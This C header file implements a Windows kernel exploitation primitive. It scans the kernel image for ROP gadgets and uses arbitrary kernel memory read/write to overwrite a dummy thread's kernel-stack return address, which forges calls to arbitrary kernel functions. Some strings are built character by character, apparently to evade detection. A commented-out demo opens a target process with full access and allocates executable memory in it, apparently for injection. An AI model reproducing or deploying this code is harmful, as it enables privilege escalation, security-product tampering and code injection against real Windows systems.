#pragma once
#include"Utils.h"

// StackBase and KernelStack field offset
#define KTHREAD_InitialStack    0x28
#define KTHREAD_StackLimit  0x30

// magic exit code for DummyThread()
#define THREAD_EXIT_CODE 0x1337

ULONG g_KernelSize = NULL;
ULONG64 g_KernelAddr = NULL;

PVOID g_KernelImage = NULL;
ULONG g_dwKernelImageSize = NULL;

// ROP gadgets used to forge function calls
PVOID g_RopAddr_1 = NULL, g_RopAddr_2 = NULL;
PVOID g_RopAddr_3 = NULL, g_RopAddr_4 = NULL, g_RopAddr_5 = NULL, g_RopAddr_6 = NULL;

// convert KfCall() return value
#define KF_RET(_val_) ((PVOID *)(_val_))

// mandatory function
PVOID g_ZwTerminateThread = NULL;

BOOL MatchSign(PUCHAR Data, PUCHAR Sign, int Size)
{
	for (int i = 0; i < Size; i += 1)
	{
		if (Sign[i] == 0xff)
		{
			// 0xff means to match any value
			continue;
		}

		if (Sign[i] != Data[i])
		{
			// not matched
			return FALSE;
		}
	}

	return TRUE;
}

BOOL GetSyscallNumber(char* lpszProcName, PDWORD pdwRet)
{
	// get ntdll image address
	char ntdllStr[] = { 'n','t','d','l','l','.','d','l','l','\0' };
	HMODULE hImage = GetModuleHandle(ntdllStr);
	if (hImage == NULL)
	{
		return FALSE;
	}

	// get syscall stub address
	PUCHAR Addr = (PUCHAR)GetProcAddress(hImage, lpszProcName);
	if (Addr == NULL)
	{
		return FALSE;
	}

	// check for mov eax, imm32 instruction
	if (*(Addr + 3) == 0xb8)
	{
		// return instruction argument, syscall number
		*pdwRet = *(PDWORD)(Addr + 4);
		return TRUE;
	}

	return FALSE;
}

PVOID GetKernelZwProcAddress(char* lpszProcName)
{
	PVOID Addr = NULL;
	DWORD dwSyscallNumber = 0;

	if (g_KernelImage == NULL || g_KernelAddr == NULL)
		return FALSE;

	// get target function syscall number
	if (!GetSyscallNumber(lpszProcName, &dwSyscallNumber))
		return NULL;

	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
		RVATOVA(g_KernelImage, ((PIMAGE_DOS_HEADER)g_KernelImage)->e_lfanew);

	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
		RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

	for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
	{
		// check for the code sectin
		if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
			(pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
		{
			for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
			{
				DWORD Ptr = pSection->VirtualAddress + n;

				/*
					Signature of Zw stub to call system calls from kernel drivers.
				*/
				UCHAR Sign[] = "\x48\x8B\xC4"                  // mov     rax, rsp
					"\xFA"                          // cli
					"\x48\x83\xEC\x10"              // sub     rsp, 10h
					"\x50"                          // push    rax
					"\x9C"                          // pushfq
					"\x6A\x10"                      // push    10h
					"\x48\x8D\x05\xFF\xFF\xFF\xFF"  // lea     rax, KiServiceLinkage
					"\x50"                          // push    rax
					"\xB8\x00\x00\x00\x00"          // mov     eax, XXXXXXXX
					"\xE9\xFF\xFF\xFF\xFF";         // jmp     KiServiceInternal

				*(PDWORD)(Sign + 0x15) = dwSyscallNumber;

				// match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign, sizeof(Sign) - 1))
				{
					// calculate an actual kernel address
					Addr = RVATOVA(g_KernelAddr, Ptr);
				}
			}
		}

		pSection += 1;
	}

	return Addr;
}

BOOL RopInit(ULONG64 allocatePool)
{
	//ZwTerminateThread
	char ZwTerminalStr[] = { 'Z','w','T','e','r','m','i','n','a','t','e','T','h','r','e','a','d','\0' };
	char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

	if (!GetNtOsInfo((PVOID*)& g_KernelAddr, &g_KernelSize, szKernelName))
		return false;

	GetSystemDirectory(szKernelPath, MAX_PATH);
	strcat_s(szKernelPath, "\\");
	strcat_s(szKernelPath, szKernelName);

	PVOID Data = NULL;
	DWORD dwDataSize = 0;

	if (ReadFromFile(szKernelPath, &Data, &dwDataSize))
	{
		// load kernel image into the userland
		if (LdrMapImage(Data, dwDataSize, &g_KernelImage, &g_dwKernelImageSize))
		{
			// relocate kernel image to its actual address
			LdrProcessRelocs(g_KernelImage, (PVOID)g_KernelAddr);
		}

		M_FREE(Data);
	}

	if (!g_KernelImage)
		return false;

	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
		RVATOVA(g_KernelImage, ((PIMAGE_DOS_HEADER)g_KernelImage)->e_lfanew);

	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
		RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

	for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
	{
		// check for the code sectin
		if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
			(pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
		{
			for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
			{
				DWORD Ptr = pSection->VirtualAddress + n;

				/*
					Signature of nt!_guard_retpoline_exit_indirect_rax() used as
					ROP gadget to control function argument registers
				*/
				UCHAR Sign_1[] = "\x48\x8b\x44\x24\x20"          // mov     rax, [rsp+0x20]
					"\x48\x8b\x4c\x24\x28"          // mov     rcx, [rsp+0x28]
					"\x48\x8b\x54\x24\x30"          // mov     rdx, [rsp+0x30]
					"\x4c\x8b\x44\x24\x38"          // mov     r8, [rsp+0x38]
					"\x4c\x8b\x4c\x24\x40"          // mov     r9, [rsp+0x40] 
					"\x48\x83\xC4\x48"              // add     rsp, 48h
					"\x48\xFF\xE0";                 // jmp     rax

				// match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign_1, sizeof(Sign_1) - 1))
				{
					// calculate an actual kernel address
					g_RopAddr_1 = RVATOVA(g_KernelAddr, Ptr);
				}

				/*
					ROP gadget used to reserve an extra space for the stack arguments
				*/
				UCHAR Sign_2[] = "\x48\x83\xC4\x68"              // add     rsp, 68h
					"\xC3";                         // retn

				 // match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign_2, sizeof(Sign_2) - 1))
				{
					// calculate an actual kernel address                        
					g_RopAddr_2 = RVATOVA(g_KernelAddr, Ptr);
				}

				/*
					RCX control ROP gadget to use in pair with the next one
				*/
				UCHAR Sign_3[] = "\x59"                          // pop     rcx
					"\xC3";                         // retn

				// match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign_3, sizeof(Sign_3) - 1))
				{
					// calculate an actual kernel address
					g_RopAddr_3 = RVATOVA(g_KernelAddr, Ptr);
				}

				/*
					ROP gadget used to save forged functoin call return value
				*/
				UCHAR Sign_4[] = "\x48\x89\x01"                  // mov     [rcx], rax
					"\xC3";                         // retn

				// match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign_4, sizeof(Sign_4) - 1))
				{
					// calculate an actual kernel address
					g_RopAddr_4 = RVATOVA(g_KernelAddr, Ptr);

					// dummy dagdet for stack alignment
					g_RopAddr_5 = RVATOVA(g_KernelAddr, Ptr + 3);
				}

				//48 33 c0 c3
				UCHAR Sign_6[] = "\x48\x33\xC0"              // xor rax, rax
					             "\xC3";                     // retn

				 // match the signature
				if (MatchSign(RVATOVA(g_KernelImage, Ptr), Sign_6, sizeof(Sign_6) - 1))
				{
					// calculate an actual kernel address                        
					g_RopAddr_6 = RVATOVA(g_KernelAddr, Ptr);
				}

			}
		}

		pSection += 1;
	}

	if (!g_RopAddr_1 && allocatePool)
	{
		UCHAR Sign_1[] = "\x48\x8b\x44\x24\x20"          // mov     rax, [rsp+0x20]
			"\x48\x8b\x4c\x24\x28"                       // mov     rcx, [rsp+0x28]
			"\x48\x8b\x54\x24\x30"                       // mov     rdx, [rsp+0x30]
			"\x4c\x8b\x44\x24\x38"                       // mov     r8, [rsp+0x38]
			"\x4c\x8b\x4c\x24\x40"                       // mov     r9, [rsp+0x40] 
			"\x48\x83\xC4\x48"                           // add     rsp, 48h
			"\x48\xFF\xE0";                              // jmp     rax
		NTSTATUS status = ReadWriteVirtualAddressValue(allocatePool, sizeof(Sign_1), Sign_1, false);
		if(NT_SUCCESS(status))
			g_RopAddr_1 = (PVOID)allocatePool;
	}

	if (g_RopAddr_1 == NULL || g_RopAddr_2 == NULL || g_RopAddr_3 == NULL || g_RopAddr_4 == NULL || g_RopAddr_5 == NULL)
	{
#ifdef _DEBUG
		printf("find rop gadget error\n");
		printf("ROP gadget #1 is at 0x%p\n", g_RopAddr_1);
		printf("ROP gadget #2 is at 0x%p\n", g_RopAddr_2);
		printf("ROP gadget #3 is at 0x%p\n", g_RopAddr_3);
		printf("ROP gadget #4 is at 0x%p\n", g_RopAddr_4);
		printf("ROP gadget #5 is at 0x%p\n", g_RopAddr_5);
#endif
		goto _end;
	}
		
#ifdef _DEBUG
	printf("ROP gadget #1 is at 0x%p\n", g_RopAddr_1);
	printf("ROP gadget #2 is at 0x%p\n", g_RopAddr_2);
	printf("ROP gadget #3 is at 0x%p\n", g_RopAddr_3);
	printf("ROP gadget #4 is at 0x%p\n", g_RopAddr_4);
	printf("ROP gadget #5 is at 0x%p\n", g_RopAddr_5);
#endif

	/*
		Get address of nt!ZwTerminateThread(), we need this function
		to gracefully shutdown our dummy thread with fucked up kernel stack
	*/
	if ((g_ZwTerminateThread = GetKernelZwProcAddress(ZwTerminalStr)) == NULL)
		goto _end;

_end:
	if (g_KernelImage)
	{
		M_FREE(g_KernelImage);
		g_KernelImage = NULL;
		g_dwKernelImageSize = 0;
	}

	return true;
}

PVOID GetSystemInformation(ULONG InfoClass)
{
	NTSTATUS Status = 0;
	ULONG RetSize = 0, Size = 0x100;
	PVOID Info = NULL;

	while (true)
	{
		RetSize = 0;

		// allocate memory for system information
		if ((Info = M_ALLOC(Size)) == NULL)
		{
			return NULL;
		}

		// query information        
		if ((Status = NtQuerySystemInformation(InfoClass, Info, Size, &RetSize)) == STATUS_INFO_LENGTH_MISMATCH)
		{
			// buffer is too small
			M_FREE(Info);

			// allocate more memory and try again
			Size = RetSize + 0x100;
		}
		else
		{
			break;
		}
	}

	if (!NT_SUCCESS(Status))
	{
		if (Info)
		{
			// cleanup
			M_FREE(Info);
		}

		return NULL;
	}

	return Info;
}

DWORD GetThreadState(DWORD dwProcessId, DWORD dwThreadId)
{
	DWORD Ret = -1;

	// query processes and threads information
	PSYSTEM_PROCESS_INFORMATION ProcessInfo =
		(PSYSTEM_PROCESS_INFORMATION)GetSystemInformation(5);

	if (ProcessInfo)
	{
		PSYSTEM_PROCESS_INFORMATION Info = ProcessInfo;

		while (true)
		{
			// check for desired process
			if (Info->UniqueProcessId == (HANDLE)dwProcessId)
			{
				// enumerate treads
				for (DWORD i = 0; i < Info->NumberOfThreads; i += 1)
				{
					// check for desired thread
					if (Info->Threads[i].ClientId.UniqueThread == (HANDLE)dwThreadId)
					{
						Ret = Info->Threads[i].ThreadState;
						goto _end;
					}
				}

				break;
			}

			if (Info->NextEntryOffset == 0)
			{
				// end of the list
				break;
			}

			// go to the next process info entry
			Info = (PSYSTEM_PROCESS_INFORMATION)RVATOVA(Info, Info->NextEntryOffset);
		}
	_end:
		M_FREE(ProcessInfo);
	}

	return Ret;
}

DWORD WINAPI DummyThread(LPVOID lpParam)
{
	HANDLE hEvent = lpParam;
	WaitForSingleObject(hEvent, INFINITE);
	return 0;
}

PVOID GetObjectAddress(HANDLE hObject)
{
	PVOID Ret = NULL;

	// query all system handles information
	PSYSTEM_HANDLE_INFORMATION HandleInfo =
		(PSYSTEM_HANDLE_INFORMATION)GetSystemInformation(16);

	if (HandleInfo)
	{
		for (DWORD i = 0; i < HandleInfo->NumberOfHandles; i += 1)
		{
			// lookup for pointer to the our object
			if (HandleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
				HandleInfo->Handles[i].HandleValue == (USHORT)hObject)
			{
				Ret = HandleInfo->Handles[i].Object;
				break;
			}
		}

		M_FREE(HandleInfo);
	}

	return Ret;
}

BOOL RopCallAddr(PVOID ProcAddr, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
{
	BOOL bRet = FALSE;
	HANDLE hThread = NULL, hEvent = NULL;
	PVOID RetVal = NULL;
	PVOID RetAddr = NULL;
	PUCHAR initialStack = NULL, stackLimit = NULL;
	PUCHAR Ptr = NULL;
	PVOID pThread = NULL;
	DWORD dwThreadId = 0;

	if (dwArgsCount > MAX_ARGS)
	{
		return FALSE;
	}

	// create waitable event
	if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
	{
		goto _end;
	}

	// create dummy thread
	if ((hThread = CreateThread(NULL, 0, DummyThread, hEvent, 0, &dwThreadId)) == NULL)
	{
		goto _end;
	}

	while (true)
	{
		// determine current state of dummy thread
		DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
		if (State == -1)
		{
			goto _end;
		}

		if (State == Waiting)
		{
			// thread was entered into the wait state
			break;
		}

		SwitchToThread();
	}

	// get _KTHREAD address by handle
	pThread = GetObjectAddress(hThread);
	if (pThread == NULL)
	{
		goto _end;
	}

	// get stack base of the thread
	if (!MemReadPtr(RVATOVA(pThread, KTHREAD_InitialStack), (PVOID*)& initialStack))
	{
		goto _end;
	}

	// get stack pointer of the thread
	if (!MemReadPtr(RVATOVA(pThread, KTHREAD_StackLimit), (PVOID*)& stackLimit))
	{
		goto _end;
	}

	Ptr = initialStack - sizeof(PVOID);

	// walk over the kernel stack
	while (Ptr > stackLimit)
	{
		DWORD_PTR Val = 0;

		// read stack value
		if (!MemReadPtr(Ptr, (PVOID*)& Val))
		{
			goto _end;
		}

		/*
			Check for the return address from system call handler back to
			the nt!KiSystemServiceCopyEnd(), it's located at the bottom
			of the kernel stack.
		*/
		if (Val > g_KernelAddr &&
			Val < g_KernelAddr + g_KernelSize)
		{
			RetAddr = Ptr;
			break;
		}

		// go to the next stack location
		Ptr -= sizeof(PVOID);
	}

	if (RetAddr == NULL)
	{
		goto _end;
	}

#define STACK_PUT(_offset_, _val_)                                                          \
                                                                                                \
        if (!MemWritePtr(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_)))                         \
        {                                                                                       \
            goto _end;                                                                          \
        }

	// hijack the return address with forged function call
	STACK_PUT(0x00, g_RopAddr_1);

	// save an address for the forged function call
	STACK_PUT(0x08 + 0x20, ProcAddr);

	if (dwArgsCount > 0)
	{
		// 1-st argument goes in RCX
		STACK_PUT(0x08 + 0x28, Args[0]);
	}

	if (dwArgsCount > 1)
	{
		// 2-nd argument goes in RDX
		STACK_PUT(0x08 + 0x30, Args[1]);
	}

	if (dwArgsCount > 2)
	{
		// 3-rd argument goes in R8
		STACK_PUT(0x08 + 0x38, Args[2]);
	}

	if (dwArgsCount > 3)
	{
		// 4-th argument goes in R9
		STACK_PUT(0x08 + 0x40, Args[3]);
	}

	// reserve shadow space and 9 stack arguments
	STACK_PUT(0x50, g_RopAddr_2);

	for (DWORD i = 4; i < dwArgsCount; i += 1)
	{
		// the rest arguments goes over the stack right after the shadow space
		STACK_PUT(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);
	}

	// obtain RetVal address
	STACK_PUT(0xc0, g_RopAddr_3);
	STACK_PUT(0xc8, &RetVal);

	// save return value of the forged function call
	STACK_PUT(0xd0, g_RopAddr_4);

	// dummy gadget for stack alignment
	STACK_PUT(0xd8, g_RopAddr_5);

	// put the next function call
	STACK_PUT(0xe0, g_RopAddr_1);

	// forge nt!ZwTerminateThread() function call
	STACK_PUT(0xe8 + 0x20, g_ZwTerminateThread);
	STACK_PUT(0xe8 + 0x28, hThread);
	STACK_PUT(0xe8 + 0x30, THREAD_EXIT_CODE);

	SwitchToThread();

_end:

	if (hEvent && hThread)
	{
		DWORD dwExitCode = 0;

		// put thread into the ready state
		SetEvent(hEvent);
		WaitForSingleObject(hThread, INFINITE);

		GetExitCodeThread(hThread, &dwExitCode);

		// check for the magic exit code set by forged call
		if (dwExitCode == THREAD_EXIT_CODE)
		{
			if (pRetVal)
			{
				// return value of the function
				*pRetVal = RetVal;
			}

			bRet = TRUE;
		}
	}

	if (hEvent)
	{
		CloseHandle(hEvent);
	}

	if (hThread)
	{
		CloseHandle(hThread);
	}

	return bRet;
}

BOOL RopCall(char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
{
	PVOID FuncAddr = NULL;

	if ((FuncAddr = (PVOID)GetKernelFuncAddress(lpszProcName)) == NULL)
	{
		//Zw
		char zwStr[] = {'Z','w','\0'};
		if (!strncmp(lpszProcName, zwStr, 2))
		{
			// try to obtain not exported Zw function address
			FuncAddr = GetKernelZwProcAddress(lpszProcName);
		}
	}

	if (FuncAddr == NULL)
		return FALSE;

	// perform the call
	return RopCallAddr(FuncAddr, Args, dwArgsCount, pRetVal);
}

//void RopDemo(HANDLE pid)
//{
//	CLIENT_ID ClientId;
//	OBJECT_ATTRIBUTES ObjAttr;
//	DWORD_PTR Status;
//	InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
//
//	ClientId.UniqueProcess = pid;
//	ClientId.UniqueThread = NULL;
//	HANDLE hProcess = NULL;
//	PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
//					   KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
//					   KF_ARG(&ObjAttr),                    // ObjectAttributes
//					   KF_ARG(&ClientId) };                 // ClientId
//
//	// open the target process
//	if (!RopCall((char*)"ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
//	{
//		printf("ERROR: KfCall() fails\n");
//	}
//	printf("hProcess %llx,Status %x \n", hProcess, Status);
//
//	PVOID ImageAddr = NULL;
//	SIZE_T dwImageSize = 0x1000;
//	PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
//			   KF_ARG(&ImageAddr),                  // BaseAddress
//			   KF_ARG(0),                           // ZeroBits
//			   KF_ARG(&dwImageSize),                  // RegionSize
//			   KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
//			   KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect
//
//	// allocate memory for the DLL image
//	if (!RopCall((char*)"ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
//	{
//		printf("ERROR: KfCall() fails\n");
//	}
//	printf("ImageAddr %llx  Status %x\n", ImageAddr, Status);
//
//
//	PVOID Args[] = { KF_ARG(hProcess) };
//
//	// close target process handle
//	if (!RopCall((char*)"ZwClose", Args, 1, KF_RET(&Status)))
//	{
//		printf("ZwClose() ERROR 0x%.8x\n", Status);
//	}
//	printf("Status %x\n", Status);
//
//}